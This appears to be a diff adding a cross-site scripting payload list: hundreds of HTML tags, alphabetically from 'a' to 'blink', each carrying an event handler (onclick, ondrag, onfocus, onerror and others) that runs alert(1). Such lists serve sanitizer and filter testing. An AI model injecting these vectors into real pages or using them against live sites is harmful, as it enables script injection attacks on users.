@@ -1,0 +1,529 @@
+<a draggable="true" ondrag="alert(1)">test</a>
+<a draggable="true" ondragend="alert(1)">test</a>
+<a draggable="true" ondragenter="alert(1)">test</a>
+<a draggable="true" ondragleave="alert(1)">test</a>
+<a draggable="true" ondragstart="alert(1)">test</a>
+<a id=x tabindex=1 onactivate=alert(1)></a>
+<a id=x tabindex=1 onbeforeactivate=alert(1)></a>
+<a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>
+<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>
+<a id=x tabindex=1 onfocus=alert(1)></a>
+<a id=x tabindex=1 onfocusin=alert(1)></a>
+<a onbeforecopy="alert(1)" contenteditable>test</a>
+<a onbeforecut="alert(1)" contenteditable>test</a>
+<a onbeforepaste="alert(1)" contenteditable>test</a>
+<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>
+<a onclick="alert(1)">test</a>
+<a oncontextmenu="alert(1)">test</a>
+<a oncopy="alert(1)" contenteditable>test</a>
+<a oncut="alert(1)" contenteditable>test</a>
+<a ondblclick="alert(1)">test</a>
+<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>
+<a onkeydown="alert(1)" contenteditable>test</a>
+<a onkeypress="alert(1)" contenteditable>test</a>
+<a onkeyup="alert(1)" contenteditable>test</a>
+<a onmousedown="alert(1)">test</a>
+<a onmouseenter="alert(1)">test</a>
+<a onmouseleave="alert(1)">test</a>
+<a onmousemove="alert(1)">test</a>
+<a onmouseout="alert(1)">test</a>
+<a onmouseover="alert(1)">test</a>
+<a onmouseup="alert(1)">test</a>
+<a onpaste="alert(1)" contenteditable>test</a>
+<abbr draggable="true" ondrag="alert(1)">test</abbr>
+<abbr draggable="true" ondragend="alert(1)">test</abbr>
+<abbr draggable="true" ondragenter="alert(1)">test</abbr>
+<abbr draggable="true" ondragleave="alert(1)">test</abbr>
+<abbr draggable="true" ondragstart="alert(1)">test</abbr>
+<abbr id=x tabindex=1 onactivate=alert(1)></abbr>
+<abbr id=x tabindex=1 onbeforeactivate=alert(1)></abbr>
+<abbr id=x tabindex=1 onbeforedeactivate=alert(1)></abbr><input autofocus>
+<abbr id=x tabindex=1 ondeactivate=alert(1)></abbr><input id=y autofocus>
+<abbr id=x tabindex=1 onfocus=alert(1)></abbr>
+<abbr id=x tabindex=1 onfocusin=alert(1)></abbr>
+<abbr onbeforecopy="alert(1)" contenteditable>test</abbr>
+<abbr onbeforecut="alert(1)" contenteditable>test</abbr>
+<abbr onbeforepaste="alert(1)" contenteditable>test</abbr>
+<abbr onblur=alert(1) tabindex=1 id=x></abbr><input autofocus>
+<abbr onclick="alert(1)">test</abbr>
+<abbr oncontextmenu="alert(1)">test</abbr>
+<abbr oncopy="alert(1)" contenteditable>test</abbr>
+<abbr oncut="alert(1)" contenteditable>test</abbr>
+<abbr ondblclick="alert(1)">test</abbr>
+<abbr onfocusout=alert(1) tabindex=1 id=x></abbr><input autofocus>
+<abbr onkeydown="alert(1)" contenteditable>test</abbr>
+<abbr onkeypress="alert(1)" contenteditable>test</abbr>
+<abbr onkeyup="alert(1)" contenteditable>test</abbr>
+<abbr onmousedown="alert(1)">test</abbr>
+<abbr onmouseenter="alert(1)">test</abbr>
+<abbr onmouseleave="alert(1)">test</abbr>
+<abbr onmousemove="alert(1)">test</abbr>
+<abbr onmouseout="alert(1)">test</abbr>
+<abbr onmouseover="alert(1)">test</abbr>
+<abbr onmouseup="alert(1)">test</abbr>
+<abbr onpaste="alert(1)" contenteditable>test</abbr>
+<acronym draggable="true" ondrag="alert(1)">test</acronym>
+<acronym draggable="true" ondragend="alert(1)">test</acronym>
+<acronym draggable="true" ondragenter="alert(1)">test</acronym>
+<acronym draggable="true" ondragleave="alert(1)">test</acronym>
+<acronym draggable="true" ondragstart="alert(1)">test</acronym>
+<acronym id=x tabindex=1 onactivate=alert(1)></acronym>
+<acronym id=x tabindex=1 onbeforeactivate=alert(1)></acronym>
+<acronym id=x tabindex=1 onbeforedeactivate=alert(1)></acronym><input autofocus>
+<acronym id=x tabindex=1 ondeactivate=alert(1)></acronym><input id=y autofocus>
+<acronym id=x tabindex=1 onfocus=alert(1)></acronym>
+<acronym id=x tabindex=1 onfocusin=alert(1)></acronym>
+<acronym onbeforecopy="alert(1)" contenteditable>test</acronym>
+<acronym onbeforecut="alert(1)" contenteditable>test</acronym>
+<acronym onbeforepaste="alert(1)" contenteditable>test</acronym>
+<acronym onblur=alert(1) tabindex=1 id=x></acronym><input autofocus>
+<acronym onclick="alert(1)">test</acronym>
+<acronym oncontextmenu="alert(1)">test</acronym>
+<acronym oncopy="alert(1)" contenteditable>test</acronym>
+<acronym oncut="alert(1)" contenteditable>test</acronym>
+<acronym ondblclick="alert(1)">test</acronym>
+<acronym onfocusout=alert(1) tabindex=1 id=x></acronym><input autofocus>
+<acronym onkeydown="alert(1)" contenteditable>test</acronym>
+<acronym onkeypress="alert(1)" contenteditable>test</acronym>
+<acronym onkeyup="alert(1)" contenteditable>test</acronym>
+<acronym onmousedown="alert(1)">test</acronym>
+<acronym onmouseenter="alert(1)">test</acronym>
+<acronym onmouseleave="alert(1)">test</acronym>
+<acronym onmousemove="alert(1)">test</acronym>
+<acronym onmouseout="alert(1)">test</acronym>
+<acronym onmouseover="alert(1)">test</acronym>
+<acronym onmouseup="alert(1)">test</acronym>
+<acronym onpaste="alert(1)" contenteditable>test</acronym>
+<address draggable="true" ondrag="alert(1)">test</address>
+<address draggable="true" ondragend="alert(1)">test</address>
+<address draggable="true" ondragenter="alert(1)">test</address>
+<address draggable="true" ondragleave="alert(1)">test</address>
+<address draggable="true" ondragstart="alert(1)">test</address>
+<address id=x tabindex=1 onactivate=alert(1)></address>
+<address id=x tabindex=1 onbeforeactivate=alert(1)></address>
+<address id=x tabindex=1 onbeforedeactivate=alert(1)></address><input autofocus>
+<address id=x tabindex=1 ondeactivate=alert(1)></address><input id=y autofocus>
+<address id=x tabindex=1 onfocus=alert(1)></address>
+<address id=x tabindex=1 onfocusin=alert(1)></address>
+<address onbeforecopy="alert(1)" contenteditable>test</address>
+<address onbeforecut="alert(1)" contenteditable>test</address>
+<address onbeforepaste="alert(1)" contenteditable>test</address>
+<address onblur=alert(1) tabindex=1 id=x></address><input autofocus>
+<address onclick="alert(1)">test</address>
+<address oncontextmenu="alert(1)">test</address>
+<address oncopy="alert(1)" contenteditable>test</address>
+<address oncut="alert(1)" contenteditable>test</address>
+<address ondblclick="alert(1)">test</address>
+<address onfocusout=alert(1) tabindex=1 id=x></address><input autofocus>
+<address onkeydown="alert(1)" contenteditable>test</address>
+<address onkeypress="alert(1)" contenteditable>test</address>
+<address onkeyup="alert(1)" contenteditable>test</address>
+<address onmousedown="alert(1)">test</address>
+<address onmouseenter="alert(1)">test</address>
+<address onmouseleave="alert(1)">test</address>
+<address onmousemove="alert(1)">test</address>
+<address onmouseout="alert(1)">test</address>
+<address onmouseover="alert(1)">test</address>
+<address onmouseup="alert(1)">test</address>
+<address onpaste="alert(1)" contenteditable>test</address>
+<applet draggable="true" ondrag="alert(1)">test</applet>
+<applet draggable="true" ondragend="alert(1)">test</applet>
+<applet draggable="true" ondragenter="alert(1)">test</applet>
+<applet draggable="true" ondragleave="alert(1)">test</applet>
+<applet draggable="true" ondragstart="alert(1)">test</applet>
+<applet id=x tabindex=1 onactivate=alert(1)></applet>
+<applet id=x tabindex=1 onbeforeactivate=alert(1)></applet>
+<applet id=x tabindex=1 onbeforedeactivate=alert(1)></applet><input autofocus>
+<applet id=x tabindex=1 ondeactivate=alert(1)></applet><input id=y autofocus>
+<applet id=x tabindex=1 onfocus=alert(1)></applet>
+<applet id=x tabindex=1 onfocusin=alert(1)></applet>
+<applet onbeforecopy="alert(1)" contenteditable>test</applet>
+<applet onbeforecut="alert(1)" contenteditable>test</applet>
+<applet onbeforepaste="alert(1)" contenteditable>test</applet>
+<applet onblur=alert(1) tabindex=1 id=x></applet><input autofocus>
+<applet onclick="alert(1)">test</applet>
+<applet oncontextmenu="alert(1)">test</applet>
+<applet oncopy="alert(1)" contenteditable>test</applet>
+<applet oncut="alert(1)" contenteditable>test</applet>
+<applet ondblclick="alert(1)">test</applet>
+<applet onfocusout=alert(1) tabindex=1 id=x></applet><input autofocus>
+<applet onkeydown="alert(1)" contenteditable>test</applet>
+<applet onkeypress="alert(1)" contenteditable>test</applet>
+<applet onkeyup="alert(1)" contenteditable>test</applet>
+<applet onmousedown="alert(1)">test</applet>
+<applet onmouseenter="alert(1)">test</applet>
+<applet onmouseleave="alert(1)">test</applet>
+<applet onmousemove="alert(1)">test</applet>
+<applet onmouseout="alert(1)">test</applet>
+<applet onmouseover="alert(1)">test</applet>
+<applet onmouseup="alert(1)">test</applet>
+<applet onpaste="alert(1)" contenteditable>test</applet>
+<applet onreadystatechange=alert(1)></applet>
+<area draggable="true" ondrag="alert(1)">test</area>
+<area draggable="true" ondragend="alert(1)">test</area>
+<area draggable="true" ondragenter="alert(1)">test</area>
+<area draggable="true" ondragleave="alert(1)">test</area>
+<area draggable="true" ondragstart="alert(1)">test</area>
+<area id=x tabindex=1 onactivate=alert(1)></area>
+<area id=x tabindex=1 onbeforeactivate=alert(1)></area>
+<area id=x tabindex=1 onbeforedeactivate=alert(1)></area><input autofocus>
+<area id=x tabindex=1 ondeactivate=alert(1)></area><input id=y autofocus>
+<area onbeforecopy="alert(1)" contenteditable>test</area>
+<area onbeforecut="alert(1)" contenteditable>test</area>
+<area onbeforepaste="alert(1)" contenteditable>test</area>
+<area onblur=alert(1) tabindex=1 id=x></area><input autofocus>
+<area onclick="alert(1)">test</area>
+<area oncontextmenu="alert(1)">test</area>
+<area oncopy="alert(1)" contenteditable>test</area>
+<area oncut="alert(1)" contenteditable>test</area>
+<area ondblclick="alert(1)">test</area>
+<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>
+<area onkeydown="alert(1)" contenteditable>test</area>
+<area onkeypress="alert(1)" contenteditable>test</area>
+<area onkeyup="alert(1)" contenteditable>test</area>
+<area onmousedown="alert(1)">test</area>
+<area onmouseenter="alert(1)">test</area>
+<area onmouseleave="alert(1)">test</area>
+<area onmousemove="alert(1)">test</area>
+<area onmouseout="alert(1)">test</area>
+<area onmouseover="alert(1)">test</area>
+<area onmouseup="alert(1)">test</area>
+<area onpaste="alert(1)" contenteditable>test</area>
+<article draggable="true" ondrag="alert(1)">test</article>
+<article draggable="true" ondragend="alert(1)">test</article>
+<article draggable="true" ondragenter="alert(1)">test</article>
+<article draggable="true" ondragleave="alert(1)">test</article>
+<article draggable="true" ondragstart="alert(1)">test</article>
+<article id=x tabindex=1 onactivate=alert(1)></article>
+<article id=x tabindex=1 onbeforeactivate=alert(1)></article>
+<article id=x tabindex=1 onbeforedeactivate=alert(1)></article><input autofocus>
+<article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>
+<article id=x tabindex=1 onfocus=alert(1)></article>
+<article id=x tabindex=1 onfocusin=alert(1)></article>
+<article onbeforecopy="alert(1)" contenteditable>test</article>
+<article onbeforecut="alert(1)" contenteditable>test</article>
+<article onbeforepaste="alert(1)" contenteditable>test</article>
+<article onblur=alert(1) tabindex=1 id=x></article><input autofocus>
+<article onclick="alert(1)">test</article>
+<article oncontextmenu="alert(1)">test</article>
+<article oncopy="alert(1)" contenteditable>test</article>
+<article oncut="alert(1)" contenteditable>test</article>
+<article ondblclick="alert(1)">test</article>
+<article onfocusout=alert(1) tabindex=1 id=x></article><input autofocus>
+<article onkeydown="alert(1)" contenteditable>test</article>
+<article onkeypress="alert(1)" contenteditable>test</article>
+<article onkeyup="alert(1)" contenteditable>test</article>
+<article onmousedown="alert(1)">test</article>
+<article onmouseenter="alert(1)">test</article>
+<article onmouseleave="alert(1)">test</article>
+<article onmousemove="alert(1)">test</article>
+<article onmouseout="alert(1)">test</article>
+<article onmouseover="alert(1)">test</article>
+<article onmouseup="alert(1)">test</article>
+<article onpaste="alert(1)" contenteditable>test</article>
+<aside draggable="true" ondrag="alert(1)">test</aside>
+<aside draggable="true" ondragend="alert(1)">test</aside>
+<aside draggable="true" ondragenter="alert(1)">test</aside>
+<aside draggable="true" ondragleave="alert(1)">test</aside>
+<aside draggable="true" ondragstart="alert(1)">test</aside>
+<aside id=x tabindex=1 onactivate=alert(1)></aside>
+<aside id=x tabindex=1 onbeforeactivate=alert(1)></aside>
+<aside id=x tabindex=1 onbeforedeactivate=alert(1)></aside><input autofocus>
+<aside id=x tabindex=1 ondeactivate=alert(1)></aside><input id=y autofocus>
+<aside id=x tabindex=1 onfocus=alert(1)></aside>
+<aside id=x tabindex=1 onfocusin=alert(1)></aside>
+<aside onbeforecopy="alert(1)" contenteditable>test</aside>
+<aside onbeforecut="alert(1)" contenteditable>test</aside>
+<aside onbeforepaste="alert(1)" contenteditable>test</aside>
+<aside onblur=alert(1) tabindex=1 id=x></aside><input autofocus>
+<aside onclick="alert(1)">test</aside>
+<aside oncontextmenu="alert(1)">test</aside>
+<aside oncopy="alert(1)" contenteditable>test</aside>
+<aside oncut="alert(1)" contenteditable>test</aside>
+<aside ondblclick="alert(1)">test</aside>
+<aside onfocusout=alert(1) tabindex=1 id=x></aside><input autofocus>
+<aside onkeydown="alert(1)" contenteditable>test</aside>
+<aside onkeypress="alert(1)" contenteditable>test</aside>
+<aside onkeyup="alert(1)" contenteditable>test</aside>
+<aside onmousedown="alert(1)">test</aside>
+<aside onmouseenter="alert(1)">test</aside>
+<aside onmouseleave="alert(1)">test</aside>
+<aside onmousemove="alert(1)">test</aside>
+<aside onmouseout="alert(1)">test</aside>
+<aside onmouseover="alert(1)">test</aside>
+<aside onmouseup="alert(1)">test</aside>
+<aside onpaste="alert(1)" contenteditable>test</aside>
+<audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio draggable="true" ondrag="alert(1)">test</audio>
+<audio draggable="true" ondragend="alert(1)">test</audio>
+<audio draggable="true" ondragenter="alert(1)">test</audio>
+<audio draggable="true" ondragleave="alert(1)">test</audio>
+<audio draggable="true" ondragstart="alert(1)">test</audio>
+<audio id=x controls onfocus=alert(1) id=x><source src="validaudio.wav"></audio>
+<audio id=x controls onfocusin=alert(1) id=x><source src="validaudio.wav"></audio>
+<audio id=x tabindex=1 onactivate=alert(1)></audio>
+<audio id=x tabindex=1 onbeforeactivate=alert(1)></audio>
+<audio id=x tabindex=1 onbeforedeactivate=alert(1)></audio><input autofocus>
+<audio id=x tabindex=1 ondeactivate=alert(1)></audio><input id=y autofocus>
+<audio onbeforecopy="alert(1)" contenteditable>test</audio>
+<audio onbeforecut="alert(1)" contenteditable>test</audio>
+<audio onbeforepaste="alert(1)" contenteditable>test</audio>
+<audio onblur=alert(1) tabindex=1 id=x></audio><input autofocus>
+<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio onclick="alert(1)">test</audio>
+<audio oncontextmenu="alert(1)">test</audio>
+<audio oncopy="alert(1)" contenteditable>test</audio>
+<audio oncut="alert(1)" contenteditable>test</audio>
+<audio ondblclick="alert(1)">test</audio>
+<audio onfocusout=alert(1) tabindex=1 id=x></audio><input autofocus>
+<audio onkeydown="alert(1)" contenteditable>test</audio>
+<audio onkeypress="alert(1)" contenteditable>test</audio>
+<audio onkeyup="alert(1)" contenteditable>test</audio>
+<audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio onmousedown="alert(1)">test</audio>
+<audio onmouseenter="alert(1)">test</audio>
+<audio onmouseleave="alert(1)">test</audio>
+<audio onmousemove="alert(1)">test</audio>
+<audio onmouseout="alert(1)">test</audio>
+<audio onmouseover="alert(1)">test</audio>
+<audio onmouseup="alert(1)">test</audio>
+<audio onpaste="alert(1)" contenteditable>test</audio>
+<audio src/onerror=alert(1)>
+<b draggable="true" ondrag="alert(1)">test</b>
+<b draggable="true" ondragend="alert(1)">test</b>
+<b draggable="true" ondragenter="alert(1)">test</b>
+<b draggable="true" ondragleave="alert(1)">test</b>
+<b draggable="true" ondragstart="alert(1)">test</b>
+<b id=x tabindex=1 onactivate=alert(1)></b>
+<b id=x tabindex=1 onbeforeactivate=alert(1)></b>
+<b id=x tabindex=1 onbeforedeactivate=alert(1)></b><input autofocus>
+<b id=x tabindex=1 ondeactivate=alert(1)></b><input id=y autofocus>
+<b id=x tabindex=1 onfocus=alert(1)></b>
+<b id=x tabindex=1 onfocusin=alert(1)></b>
+<b onbeforecopy="alert(1)" contenteditable>test</b>
+<b onbeforecut="alert(1)" contenteditable>test</b>
+<b onbeforepaste="alert(1)" contenteditable>test</b>
+<b onblur=alert(1) tabindex=1 id=x></b><input autofocus>
+<b onclick="alert(1)">test</b>
+<b oncontextmenu="alert(1)">test</b>
+<b oncopy="alert(1)" contenteditable>test</b>
+<b oncut="alert(1)" contenteditable>test</b>
+<b ondblclick="alert(1)">test</b>
+<b onfocusout=alert(1) tabindex=1 id=x></b><input autofocus>
+<b onkeydown="alert(1)" contenteditable>test</b>
+<b onkeypress="alert(1)" contenteditable>test</b>
+<b onkeyup="alert(1)" contenteditable>test</b>
+<b onmousedown="alert(1)">test</b>
+<b onmouseenter="alert(1)">test</b>
+<b onmouseleave="alert(1)">test</b>
+<b onmousemove="alert(1)">test</b>
+<b onmouseout="alert(1)">test</b>
+<b onmouseover="alert(1)">test</b>
+<b onmouseup="alert(1)">test</b>
+<b onpaste="alert(1)" contenteditable>test</b>
+<base draggable="true" ondrag="alert(1)">test</base>
+<base draggable="true" ondragend="alert(1)">test</base>
+<base draggable="true" ondragenter="alert(1)">test</base>
+<base draggable="true" ondragleave="alert(1)">test</base>
+<base draggable="true" ondragstart="alert(1)">test</base>
+<base id=x tabindex=1 onactivate=alert(1)></base>
+<base id=x tabindex=1 onbeforeactivate=alert(1)></base>
+<base id=x tabindex=1 onbeforedeactivate=alert(1)></base><input autofocus>
+<base id=x tabindex=1 ondeactivate=alert(1)></base><input id=y autofocus>
+<base id=x tabindex=1 onfocus=alert(1)></base>
+<base id=x tabindex=1 onfocusin=alert(1)></base>
+<base onbeforecopy="alert(1)" contenteditable>test</base>
+<base onbeforecut="alert(1)" contenteditable>test</base>
+<base onbeforepaste="alert(1)" contenteditable>test</base>
+<base onblur=alert(1) tabindex=1 id=x></base><input autofocus>
+<base onclick="alert(1)">test</base>
+<base oncontextmenu="alert(1)">test</base>
+<base oncopy="alert(1)" contenteditable>test</base>
+<base oncut="alert(1)" contenteditable>test</base>
+<base ondblclick="alert(1)">test</base>
+<base onfocusout=alert(1) tabindex=1 id=x></base><input autofocus>
+<base onkeydown="alert(1)" contenteditable>test</base>
+<base onkeypress="alert(1)" contenteditable>test</base>
+<base onkeyup="alert(1)" contenteditable>test</base>
+<base onmousedown="alert(1)">test</base>
+<base onmouseenter="alert(1)">test</base>
+<base onmouseleave="alert(1)">test</base>
+<base onmousemove="alert(1)">test</base>
+<base onmouseout="alert(1)">test</base>
+<base onmouseover="alert(1)">test</base>
+<base onmouseup="alert(1)">test</base>
+<base onpaste="alert(1)" contenteditable>test</base>
+<basefont draggable="true" ondrag="alert(1)">test</basefont>
+<basefont draggable="true" ondragend="alert(1)">test</basefont>
+<basefont draggable="true" ondragenter="alert(1)">test</basefont>
+<basefont draggable="true" ondragleave="alert(1)">test</basefont>
+<basefont draggable="true" ondragstart="alert(1)">test</basefont>
+<basefont id=x tabindex=1 onactivate=alert(1)></basefont>
+<basefont id=x tabindex=1 onbeforeactivate=alert(1)></basefont>
+<basefont id=x tabindex=1 onbeforedeactivate=alert(1)></basefont><input autofocus>
+<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>
+<basefont id=x tabindex=1 onfocus=alert(1)></basefont>
+<basefont id=x tabindex=1 onfocusin=alert(1)></basefont>
+<basefont onbeforecopy="alert(1)" contenteditable>test</basefont>
+<basefont onbeforecut="alert(1)" contenteditable>test</basefont>
+<basefont onbeforepaste="alert(1)" contenteditable>test</basefont>
+<basefont onblur=alert(1) tabindex=1 id=x></basefont><input autofocus>
+<basefont onclick="alert(1)">test</basefont>
+<basefont oncontextmenu="alert(1)">test</basefont>
+<basefont oncopy="alert(1)" contenteditable>test</basefont>
+<basefont oncut="alert(1)" contenteditable>test</basefont>
+<basefont ondblclick="alert(1)">test</basefont>
+<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>
+<basefont onkeydown="alert(1)" contenteditable>test</basefont>
+<basefont onkeypress="alert(1)" contenteditable>test</basefont>
+<basefont onkeyup="alert(1)" contenteditable>test</basefont>
+<basefont onmousedown="alert(1)">test</basefont>
+<basefont onmouseenter="alert(1)">test</basefont>
+<basefont onmouseleave="alert(1)">test</basefont>
+<basefont onmousemove="alert(1)">test</basefont>
+<basefont onmouseout="alert(1)">test</basefont>
+<basefont onmouseover="alert(1)">test</basefont>
+<basefont onmouseup="alert(1)">test</basefont>
+<basefont onpaste="alert(1)" contenteditable>test</basefont>
+<bdi draggable="true" ondrag="alert(1)">test</bdi>
+<bdi draggable="true" ondragend="alert(1)">test</bdi>
+<bdi draggable="true" ondragenter="alert(1)">test</bdi>
+<bdi draggable="true" ondragleave="alert(1)">test</bdi>
+<bdi draggable="true" ondragstart="alert(1)">test</bdi>
+<bdi id=x tabindex=1 onactivate=alert(1)></bdi>
+<bdi id=x tabindex=1 onbeforeactivate=alert(1)></bdi>
+<bdi id=x tabindex=1 onbeforedeactivate=alert(1)></bdi><input autofocus>
+<bdi id=x tabindex=1 ondeactivate=alert(1)></bdi><input id=y autofocus>
+<bdi id=x tabindex=1 onfocus=alert(1)></bdi>
+<bdi id=x tabindex=1 onfocusin=alert(1)></bdi>
+<bdi onbeforecopy="alert(1)" contenteditable>test</bdi>
+<bdi onbeforecut="alert(1)" contenteditable>test</bdi>
+<bdi onbeforepaste="alert(1)" contenteditable>test</bdi>
+<bdi onblur=alert(1) tabindex=1 id=x></bdi><input autofocus>
+<bdi onclick="alert(1)">test</bdi>
+<bdi oncontextmenu="alert(1)">test</bdi>
+<bdi oncopy="alert(1)" contenteditable>test</bdi>
+<bdi oncut="alert(1)" contenteditable>test</bdi>
+<bdi ondblclick="alert(1)">test</bdi>
+<bdi onfocusout=alert(1) tabindex=1 id=x></bdi><input autofocus>
+<bdi onkeydown="alert(1)" contenteditable>test</bdi>
+<bdi onkeypress="alert(1)" contenteditable>test</bdi>
+<bdi onkeyup="alert(1)" contenteditable>test</bdi>
+<bdi onmousedown="alert(1)">test</bdi>
+<bdi onmouseenter="alert(1)">test</bdi>
+<bdi onmouseleave="alert(1)">test</bdi>
+<bdi onmousemove="alert(1)">test</bdi>
+<bdi onmouseout="alert(1)">test</bdi>
+<bdi onmouseover="alert(1)">test</bdi>
+<bdi onmouseup="alert(1)">test</bdi>
+<bdi onpaste="alert(1)" contenteditable>test</bdi>
+<bdo draggable="true" ondrag="alert(1)">test</bdo>
+<bdo draggable="true" ondragend="alert(1)">test</bdo>
+<bdo draggable="true" ondragenter="alert(1)">test</bdo>
+<bdo draggable="true" ondragleave="alert(1)">test</bdo>
+<bdo draggable="true" ondragstart="alert(1)">test</bdo>
+<bdo id=x tabindex=1 onactivate=alert(1)></bdo>
+<bdo id=x tabindex=1 onbeforeactivate=alert(1)></bdo>
+<bdo id=x tabindex=1 onbeforedeactivate=alert(1)></bdo><input autofocus>
+<bdo id=x tabindex=1 ondeactivate=alert(1)></bdo><input id=y autofocus>
+<bdo id=x tabindex=1 onfocus=alert(1)></bdo>
+<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>
+<bdo onbeforecopy="alert(1)" contenteditable>test</bdo>
+<bdo onbeforecut="alert(1)" contenteditable>test</bdo>
+<bdo onbeforepaste="alert(1)" contenteditable>test</bdo>
+<bdo onblur=alert(1) tabindex=1 id=x></bdo><input autofocus>
+<bdo onclick="alert(1)">test</bdo>
+<bdo oncontextmenu="alert(1)">test</bdo>
+<bdo oncopy="alert(1)" contenteditable>test</bdo>
+<bdo oncut="alert(1)" contenteditable>test</bdo>
+<bdo ondblclick="alert(1)">test</bdo>
+<bdo onfocusout=alert(1) tabindex=1 id=x></bdo><input autofocus>
+<bdo onkeydown="alert(1)" contenteditable>test</bdo>
+<bdo onkeypress="alert(1)" contenteditable>test</bdo>
+<bdo onkeyup="alert(1)" contenteditable>test</bdo>
+<bdo onmousedown="alert(1)">test</bdo>
+<bdo onmouseenter="alert(1)">test</bdo>
+<bdo onmouseleave="alert(1)">test</bdo>
+<bdo onmousemove="alert(1)">test</bdo>
+<bdo onmouseout="alert(1)">test</bdo>
+<bdo onmouseover="alert(1)">test</bdo>
+<bdo onmouseup="alert(1)">test</bdo>
+<bdo onpaste="alert(1)" contenteditable>test</bdo>
+<bgsound draggable="true" ondrag="alert(1)">test</bgsound>
+<bgsound draggable="true" ondragend="alert(1)">test</bgsound>
+<bgsound draggable="true" ondragenter="alert(1)">test</bgsound>
+<bgsound draggable="true" ondragleave="alert(1)">test</bgsound>
+<bgsound draggable="true" ondragstart="alert(1)">test</bgsound>
+<bgsound id=x tabindex=1 onactivate=alert(1)></bgsound>
+<bgsound id=x tabindex=1 onbeforeactivate=alert(1)></bgsound>
+<bgsound id=x tabindex=1 onbeforedeactivate=alert(1)></bgsound><input autofocus>
+<bgsound id=x tabindex=1 ondeactivate=alert(1)></bgsound><input id=y autofocus>
+<bgsound id=x tabindex=1 onfocus=alert(1)></bgsound>
+<bgsound id=x tabindex=1 onfocusin=alert(1)></bgsound>
+<bgsound onbeforecopy="alert(1)" contenteditable>test</bgsound>
+<bgsound onbeforecut="alert(1)" contenteditable>test</bgsound>
+<bgsound onbeforepaste="alert(1)" contenteditable>test</bgsound>
+<bgsound onblur=alert(1) tabindex=1 id=x></bgsound><input autofocus>
+<bgsound onclick="alert(1)">test</bgsound>
+<bgsound oncontextmenu="alert(1)">test</bgsound>
+<bgsound oncopy="alert(1)" contenteditable>test</bgsound>
+<bgsound oncut="alert(1)" contenteditable>test</bgsound>
+<bgsound ondblclick="alert(1)">test</bgsound>
+<bgsound onfocusout=alert(1) tabindex=1 id=x></bgsound><input autofocus>
+<bgsound onkeydown="alert(1)" contenteditable>test</bgsound>
+<bgsound onkeypress="alert(1)" contenteditable>test</bgsound>
+<bgsound onkeyup="alert(1)" contenteditable>test</bgsound>
+<bgsound onmousedown="alert(1)">test</bgsound>
+<bgsound onmouseenter="alert(1)">test</bgsound>
+<bgsound onmouseleave="alert(1)">test</bgsound>
+<bgsound onmousemove="alert(1)">test</bgsound>
+<bgsound onmouseout="alert(1)">test</bgsound>
+<bgsound onmouseover="alert(1)">test</bgsound>
+<bgsound onmouseup="alert(1)">test</bgsound>
+<bgsound onpaste="alert(1)" contenteditable>test</bgsound>
+<big draggable="true" ondrag="alert(1)">test</big>
+<big draggable="true" ondragend="alert(1)">test</big>
+<big draggable="true" ondragenter="alert(1)">test</big>
+<big draggable="true" ondragleave="alert(1)">test</big>
+<big draggable="true" ondragstart="alert(1)">test</big>
+<big id=x tabindex=1 onactivate=alert(1)></big>
+<big id=x tabindex=1 onbeforeactivate=alert(1)></big>
+<big id=x tabindex=1 onbeforedeactivate=alert(1)></big><input autofocus>
+<big id=x tabindex=1 ondeactivate=alert(1)></big><input id=y autofocus>
+<big id=x tabindex=1 onfocus=alert(1)></big>
+<big id=x tabindex=1 onfocusin=alert(1)></big>
+<big onbeforecopy="alert(1)" contenteditable>test</big>
+<big onbeforecut="alert(1)" contenteditable>test</big>
+<big onbeforepaste="alert(1)" contenteditable>test</big>
+<big onblur=alert(1) tabindex=1 id=x></big><input autofocus>
+<big onclick="alert(1)">test</big>
+<big oncontextmenu="alert(1)">test</big>
+<big oncopy="alert(1)" contenteditable>test</big>
+<big oncut="alert(1)" contenteditable>test</big>
+<big ondblclick="alert(1)">test</big>
+<big onfocusout=alert(1) tabindex=1 id=x></big><input autofocus>
+<big onkeydown="alert(1)" contenteditable>test</big>
+<big onkeypress="alert(1)" contenteditable>test</big>
+<big onkeyup="alert(1)" contenteditable>test</big>
+<big onmousedown="alert(1)">test</big>
+<big onmouseenter="alert(1)">test</big>
+<big onmouseleave="alert(1)">test</big>
+<big onmousemove="alert(1)">test</big>
+<big onmouseout="alert(1)">test</big>
+<big onmouseover="alert(1)">test</big>
+<big onmouseup="alert(1)">test</big>
+<big onpaste="alert(1)" contenteditable>test</big>
+<blink draggable="true" ondrag="alert(1)">test</blink>
+<blink draggable="true" ondragend="alert(1)">test</blink>
+<blink draggable="true" ondragenter="alert(1)">test</blink>
+<blink draggable="true" ondragleave="alert(1)">test</blink>
+<blink draggable="true" ondragstart="alert(1)">test</blink>
+<blink id=x tabindex=1 onactivate=alert(1)></blink>
